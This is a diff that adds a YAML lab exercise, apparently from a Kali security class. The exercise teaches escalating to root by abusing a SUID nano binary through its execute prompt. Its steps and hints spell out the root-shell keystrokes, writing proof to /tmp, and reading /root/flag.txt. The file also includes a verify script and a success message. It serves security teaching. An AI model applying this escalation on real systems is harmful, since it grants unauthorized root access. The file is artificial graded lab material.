@@ -1,0 +1,22 @@
+id: "03"
+title: "Escalate via SUID nano"
+prompt: |
+  GTFOBins time: SUID nano can spawn a root shell via its spawner.
+
+  From the intern shell, abuse nanohelp:
+
+    nanohelp /dev/null
+    (inside nano) Ctrl+R, Ctrl+T, then type: /bin/sh
+    (nano runs the file — with SUID it runs as root)
+
+  Prove you got root: run `whoami` inside that shell and save the output
+  to ~/kali-class-work/sec-wk10/privesc-suid.txt (expect: root)
+  Then Stamp: kali-class stamp sec-wk10 privesc-suid
+hints:
+  - "In nanohelp: press Ctrl+R (read file), then Ctrl+T (execute), type /bin/sh and Enter — SUID makes it root's shell."
+  - "Non-interactive proof alternative: the GTFOBins trick — nanohelp with Ctrl+R/Ctrl+T running 'id > /tmp/proof'."
+  - "Simplest capture: nanohelp /root/flag.txt reads the capstone flag (don't rely on that here — run whoami and save it)."
+verify:
+  script: "03-privesc-suid.verify.sh"
+  timeout: 60
+on_success: "SUID nano → root. One binary, one misconfiguration, full compromise."
